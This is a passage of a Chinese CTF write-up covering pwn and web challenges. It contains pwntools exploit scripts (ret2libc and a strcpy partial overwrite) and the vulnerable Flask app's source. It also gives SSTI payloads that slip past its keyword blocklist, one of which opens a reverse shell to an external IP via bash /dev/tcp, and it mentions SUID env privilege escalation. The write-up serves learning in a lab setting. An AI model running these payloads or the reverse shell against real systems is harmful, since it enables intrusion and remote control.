class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu_choose</span>(<span class="params">io, idx: <span class="built_in">int</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_admin</span>(<span class="params">io</span>):</span><br><span class="line">    menu_choose(io, <span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;name:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;password:&#x27;</span>)</span><br><span class="line">    pwd = <span class="string">b&#x27;B&#x27;</span> * <span class="number">32</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">4</span> + <span class="string">b&#x27;C&#x27;</span> * <span class="number">4</span></span><br><span class="line">    io.send(pwd)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;successful&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_puts_via_admin_view</span>(<span class="params">io</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    menu_choose(io, <span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please enter your password:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;B&#x27;</span> * <span class="number">32</span>)</span><br><span class="line">    <span class="comment"># io.send(b&#x27;B&#x27; * 31 + b&#x27;\x00&#x27;)  strcmp会在遇到 &#x27;\0&#x27; 时停止</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;WELCOME, ADMINISTRATOR.&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recvline()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    leak = io.recvn(<span class="number">8</span>)</span><br><span class="line">    addr = u64(leak)</span><br><span class="line">    log.success(<span class="string">f&#x27;leak puts@libc = <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_feedback</span>(<span class="params">io, payload: <span class="built_in">bytes</span></span>):</span><br><span class="line">    menu_choose(io, <span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;feedback:&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">register_admin(io)</span><br><span class="line">leak_puts = leak_puts_via_admin_view(io)</span><br><span class="line">libc.address = leak_puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">f&#x27;libc base = <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;system = <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>, binsh = <span class="subst">&#123;<span class="built_in">hex</span>(binsh)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop_libc = ROP(libc)</span><br><span class="line">pop_rdi = rop_libc.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line">RET = rop_libc.find_gadget([<span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span></span><br><span class="line">payload += p64(RET)</span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">trigger_feedback(io, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="次元囚笼"><a href="#次元囚笼" class="headerlink" title="次元囚笼"></a>次元囚笼</h3><p>漏洞点<br><code>leave()</code> 中的 <code>strcpy(dest, buffer)</code> 会把全局 <code>buffer</code> 的内容复制到 32 字节的栈数组 <code>dest</code></p>
<p>最终需要利用栈溢出覆盖返回地址为后门函数 <code>last_love()</code>即可</p>
<p>由于 <code>strcpy</code> 遇到 <code>\x00</code> 会停止复制。因此无法直接通过它写入包含 0 字节的完整 64 位地址。<br>但这是 64 位小端：覆盖返回地址时，只要前 3 个字节（低 3 字节）非零且可控，第 4~8 字节若原本就是 0，即使复制在第 4 字节遇到 <code>\x00</code> 停止，也能得到想要的 8 字节地址值（高位本来就是 0）。</p>
<p>本题中：</p>
<ul>
<li>目标后门地址：<code>last_love = 0x00000000004012b3</code></li>
<li>其小端字节序：<code>b3 12 40 00 00 00 00 00</code></li>
<li>方案：构造 <code>buffer</code> 内容为：<ul>
<li>32 字节填充（溢出到保存的 RBP 前）</li>
<li>8 字节任意非零（覆盖保存的 RBP）</li>
<li>返回地址前 3 字节：<code>\xb3\x12\x40</code></li>
<li>紧跟一个 <code>\x00</code>（使 <code>strcpy</code> 停止，保留返回地址的高 5 字节为 0）</li>
</ul>
</li>
<li>这样最终函数返回地址即为 <code>0x00000000004012b3</code>，直接跳入后门函数 <code>last_love()</code>，获得 <code>/bin/sh</code></li>
</ul>
<p>最后也需要考虑栈对齐的问题，这里可以控制返回地址直接到 <code>/bin/sh</code>，规避掉这个问题，从IDA里面可以找到地址是0x4012D9</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012D9                 lea     rax, command    ; &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;geek.ctfplus.cn&#x27;</span>, <span class="number">30651</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">io, n</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;cin &gt;&gt; : &quot;</span>, <span class="built_in">str</span>(n).encode())</span><br><span class="line"></span><br><span class="line">LAST_LOVE = <span class="number">0x4012D9</span></span><br><span class="line"></span><br><span class="line">choose(p, <span class="number">3</span>)</span><br><span class="line">ret_lo3 = p64(LAST_LOVE)[:<span class="number">3</span>]</span><br><span class="line">stop = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span>+ret_lo3+stop</span><br><span class="line"><span class="comment"># payload = payload.ljust(0x32, b&#x27;X&#x27;)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">choose(p, <span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Sequal-No-Uta"><a href="#Sequal-No-Uta" class="headerlink" title="Sequal No Uta"></a>Sequal No Uta</h3><p>先fuzz被过滤字符，好像只过滤了空格</p>
<h3 id="ez-read"><a href="#ez-read" class="headerlink" title="ez_read"></a>ez_read</h3><p>随便注册一个用户，登录后发现有个任意文件读的接口，<code>/read?filename=</code></p>
<p>读取环境变量和命令行发现源码位于 <code>/opt/___web_very_strange_42___/app.py</code>，先把源码读出来</p>
<p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>, static_folder=<span class="string">&quot;static&quot;</span>)</span><br><span class="line">app.secret_key = <span class="string">&quot;key_ciallo_secret&quot;</span></span><br><span class="line"></span><br><span class="line">USERS = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">114</span>, <span class="number">514</span>):</span><br><span class="line">        <span class="keyword">return</span> payload.replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        waf = [<span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;import&quot;</span>,<span class="string">&quot;self&quot;</span>,<span class="string">&quot;session&quot;</span>,<span class="string">&quot;blueprints&quot;</span>,<span class="string">&quot;get_debug_flag&quot;</span>,<span class="string">&quot;json&quot;</span>,<span class="string">&quot;get_template_attribute&quot;</span>,<span class="string">&quot;render_template&quot;</span>,<span class="string">&quot;render_template_string&quot;</span>,<span class="string">&quot;abort&quot;</span>,<span class="string">&quot;redirect&quot;</span>,<span class="string">&quot;make_response&quot;</span>,<span class="string">&quot;Response&quot;</span>,<span class="string">&quot;stream_with_context&quot;</span>,<span class="string">&quot;flash&quot;</span>,<span class="string">&quot;escape&quot;</span>,<span class="string">&quot;Markup&quot;</span>,<span class="string">&quot;MarkupSafe&quot;</span>,<span class="string">&quot;tojson&quot;</span>,<span class="string">&quot;datetime&quot;</span>,<span class="string">&quot;cycler&quot;</span>,<span class="string">&quot;joiner&quot;</span>,<span class="string">&quot;namespace&quot;</span>,<span class="string">&quot;lipsum&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> waf:</span><br><span class="line">            <span class="keyword">if</span> w <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;waf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;用户名和密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;用户名已存在&quot;</span>)</span><br><span class="line">        USERS[username] = &#123;<span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        user = USERS.get(username)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user.get(<span class="string">&quot;password&quot;</span>) != password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, error=<span class="string">&quot;用户名或密码错误&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    name_raw = request.args.get(<span class="string">&quot;name&quot;</span>, user)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filtered = waf(name_raw)</span><br><span class="line">        tmpl = <span class="string">f&quot;欢迎，<span class="subst">&#123;filtered&#125;</span>&quot;</span></span><br><span class="line">        rendered_snippet = render_template_string(tmpl)</span><br><span class="line">        error_msg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        rendered_snippet = <span class="string">&quot;&quot;</span></span><br><span class="line">        error_msg = <span class="string">f&quot;渲染错误: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;profile.html&quot;</span>,</span><br><span class="line">        content=rendered_snippet,</span><br><span class="line">        name_input=name_raw,</span><br><span class="line">        user=user,</span><br><span class="line">        error_msg=error_msg,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    base_dir = os.path.join(os.path.dirname(__file__), <span class="string">&quot;story&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        entries = <span class="built_in">sorted</span>([f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(base_dir) <span class="keyword">if</span> os.path.isfile(os.path.join(base_dir, f))])</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        entries = []</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        filename = request.form.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filename = request.args.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    content = <span class="literal">None</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        sanitized = filename.replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        target_path = os.path.join(base_dir, sanitized)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(target_path):</span><br><span class="line">            error = <span class="string">f&quot;文件不存在: <span class="subst">&#123;sanitized&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(target_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;read.html&quot;</span>, files=entries, content=content, filename=filename, error=error, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>很容易看出来漏洞点在注册的用户名可以SSTI，然后有一些黑名单，这里用fenjing去找个能用的payload就行</p>
<p>payload1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;                          g.pop[&#x27;_&#x27;~&#x27;_globals__&#x27;].__builtins__[&#x27;__i&#x27;~&#x27;mport__&#x27;](&#x27;os&#x27;).popen(&#x27;ls / -al&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>urlencode之后去注册</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /register HTTP/1.1</span><br><span class="line">Host: 019a4ea8-c68f-7240-9628-ba289d8e4f6e.geek.ctfplus.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 362</span><br><span class="line">Origin: http://019a4ea8-c68f-7240-9628-ba289d8e4f6e.geek.ctfplus.cn</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://019a4ea8-c68f-7240-9628-ba289d8e4f6e.geek.ctfplus.cn/register</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">username=%7b%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%67%2e%70%6f%70%5b%27%5f%27%7e%27%5f%67%6c%6f%62%61%6c%73%5f%5f%27%5d%2e%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%5b%27%5f%5f%69%27%7e%27%6d%70%6f%72%74%5f%5f%27%5d%28%27%6f%73%27%29%2e%70%6f%70%65%6e%28%27%6c%73%20%2f%20%2d%61%6c%27%29%2e%72%65%61%64%28%29%7d%7d&amp;password=1</span><br></pre></td></tr></table></figure>

<p>拿到结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">total 64 </span><br><span class="line">drwxr-xr-x 1 root root 4096 Nov 4 11:37 . </span><br><span class="line">drwxr-xr-x 1 root root 4096 Nov 4 11:37 .. </span><br><span class="line">lrwxrwxrwx 1 root root 7 Aug 24 16:20 bin -&amp;gt; usr/bin </span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug 24 16:20 boot </span><br><span class="line">drwxr-xr-x 5 root root 360 Nov 4 11:37 dev </span><br><span class="line">-rwxr-xr-x 1 root root 300 Jan 1 1970 entrypoint.sh </span><br><span class="line">drwxr-xr-x 1 root root 4096 Nov 4 11:37 etc </span><br><span class="line">-r-------- 1 root root 69 Nov 4 11:37 flag </span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug 24 16:20 home </span><br><span class="line">lrwxrwxrwx 1 root root 7 Aug 24 16:20 lib -&amp;gt; usr/lib </span><br><span class="line">lrwxrwxrwx 1 root root 9 Aug 24 16:20 lib64 -&amp;gt; usr/lib64 </span><br><span class="line">drwxr-xr-x 2 root root 4096 Oct 20 00:00 media </span><br><span class="line">drwxr-xr-x 2 root root 4096 Oct 20 00:00 mnt </span><br><span class="line">drwxr-xr-x 1 root root 4096 Oct 29 07:15 opt </span><br><span class="line">dr-xr-xr-x 1018 root root 0 Nov 4 11:37 proc </span><br><span class="line">drwx------ 1 root root 4096 Oct 21 02:09 root </span><br><span class="line">drwxr-xr-x 3 root root 4096 Oct 20 00:00 run </span><br><span class="line">lrwxrwxrwx 1 root root 8 Aug 24 16:20 sbin -&amp;gt; usr/sbin </span><br><span class="line">drwxr-xr-x 2 root root 4096 Oct 20 00:00 srv </span><br><span class="line">dr-xr-xr-x 13 root root 0 Oct 24 12:47 sys </span><br><span class="line">drwxrwxrwt 1 root root 4096 Oct 29 12:08 tmp </span><br><span class="line">drwxr-xr-x 1 root root 4096 Oct 20 00:00 usr </span><br><span class="line">drwxr-xr-x 1 root root 4096 Oct 20 00:00 var</span><br></pre></td></tr></table></figure>

<p>suid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/local/bin/env </span><br></pre></td></tr></table></figure>
<p>可以发现要用env提权</p>
<p>反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;                                                                                                                                                                                                                                                                                                                                                                                           g.pop[&#x27;_&#x27;~&#x27;_globals__&#x27;].__builtins__[&#x27;__i&#x27;~&#x27;mport__&#x27;](&#x27;os&#x27;).popen(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/150.242.245.109/6666 0&gt;&amp;1&quot;&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

